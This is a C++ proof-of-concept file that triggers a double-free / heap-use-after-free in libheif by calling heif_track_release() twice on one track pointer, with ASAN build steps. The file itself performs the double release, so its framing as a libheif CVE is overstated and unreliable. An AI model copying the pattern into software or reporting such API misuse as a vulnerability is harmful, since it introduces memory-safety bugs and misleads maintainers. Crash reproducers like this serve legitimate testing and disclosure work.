/*
 * poc_trigger.cc — Double-Free / Heap-Use-After-Free in heif_track_release()
 *
 * CVE candidate: libheif <= 1.21.2
 * Bug: heif_track_release() unconditionally calls `delete track` with no guard
 *      against double-release.  Calling it twice on the same pointer corrupts
 *      the heap: the shared_ptr<HeifContext> destructor runs on freed memory.
 *
 * Build:
 *   clang++ -fsanitize=address,undefined -g -O1 \
 *           -I/src/libheif/libheif/api \
 *           poc_trigger.cc \
 *           /path/to/libheif.a <codec_libs> \
 *           -o poc_trigger
 *
 * Expected ASAN output:
 *   ERROR: AddressSanitizer: heap-use-after-free on address ...
 *   READ of size 8 in shared_ptr destructor
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>

#include "libheif/heif.h"
#include "libheif/heif_sequences.h"

/* Read a file into memory. Returns pointer (caller frees) or NULL on error. */
static unsigned char* read_file(const char* path, size_t* out_size)
{
    FILE* f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "[-] Cannot open '%s'\n", path);
        return NULL;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    rewind(f);
    if (sz <= 0) {
        fclose(f);
        return NULL;
    }
    unsigned char* buf = (unsigned char*)malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf); fclose(f); return NULL;
    }
    fclose(f);
    *out_size = (size_t)sz;
    return buf;
}

int main(int argc, char* argv[])
{
    const char* heif_path = (argc > 1) ? argv[1] : "minimal_sequence.heif";

    /* ------------------------------------------------------------------ */
    /* 1. Load HEIF sequence file into a context                           */
    /* ------------------------------------------------------------------ */
    size_t file_size = 0;
    unsigned char* file_data = read_file(heif_path, &file_size);
    if (!file_data) {
        fprintf(stderr, "[-] Failed to read HEIF file: %s\n", heif_path);
        return 1;
    }

    heif_context* ctx = heif_context_alloc();
    if (!ctx) {
        fprintf(stderr, "[-] heif_context_alloc() failed\n");
        free(file_data);
        return 1;
    }

    heif_error err = heif_context_read_from_memory_without_copy(
        ctx, file_data, file_size, NULL);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "[-] heif_context_read_from_memory_without_copy: %s\n",
                err.message);
        heif_context_free(ctx);
        free(file_data);
        return 1;
    }

    /* ------------------------------------------------------------------ */
    /* 2. Confirm at least one sequence track was parsed                  */
    /* ------------------------------------------------------------------ */
    int n_tracks = heif_context_number_of_sequence_tracks(ctx);
    fprintf(stdout, "[+] File loaded OK.  Sequence tracks: %d\n", n_tracks);
    if (n_tracks == 0) {
        fprintf(stderr, "[-] No sequence tracks found — cannot trigger bug\n");
        heif_context_free(ctx);
        free(file_data);
        return 1;
    }

    /* Retrieve track IDs */
    uint32_t* track_ids = (uint32_t*)calloc((size_t)n_tracks, sizeof(uint32_t));
    if (!track_ids) { heif_context_free(ctx); free(file_data); return 1; }
    heif_context_get_track_ids(ctx, track_ids);

    fprintf(stdout, "[+] First track ID: %u\n", track_ids[0]);

    /* ------------------------------------------------------------------ */
    /* 3. Obtain a heif_track* for the first track                         */
    /* ------------------------------------------------------------------ */
    heif_track* track = heif_context_get_track(ctx, track_ids[0]);
    if (!track) {
        fprintf(stderr, "[-] heif_context_get_track() returned NULL\n");
        free(track_ids);
        heif_context_free(ctx);
        free(file_data);
        return 1;
    }
    fprintf(stdout, "[+] Got heif_track* = %p\n", (void*)track);

    /* ------------------------------------------------------------------ */
    /* 4. First release — legitimate use, frees the heif_track object      */
    /* ------------------------------------------------------------------ */
    fprintf(stdout, "[+] First heif_track_release(track) — should succeed\n");
    heif_track_release(track);   /* OK: deletes the heif_track struct,
                                    runs shared_ptr destructors */

    /* ------------------------------------------------------------------ */
    /* 5. Second release — double-free / heap-use-after-free trigger       */
    /*                                                                      */
    /* heif_track_release() in heif_sequences.cc:55-58 is:                 */
    /*   void heif_track_release(heif_track* track) { delete track; }      */
    /*                                                                      */
    /* No nullptr guard, no validity check.  `delete track` is called on   */
    /* an already-freed pointer.  The shared_ptr<HeifContext> destructor   */
    /* attempts a reference-count read on freed memory → UAF.              */
    /* ------------------------------------------------------------------ */
    fprintf(stdout, "[+] Second heif_track_release(track) — UAF/double-free\n");
    heif_track_release(track);   /* BUG: double-free / heap-use-after-free */

    /* Should not reach here under ASAN */
    fprintf(stderr, "[-] BUG NOT TRIGGERED — is ASAN enabled?\n");

    free(track_ids);
    heif_context_free(ctx);
    free(file_data);
    return 0;
}
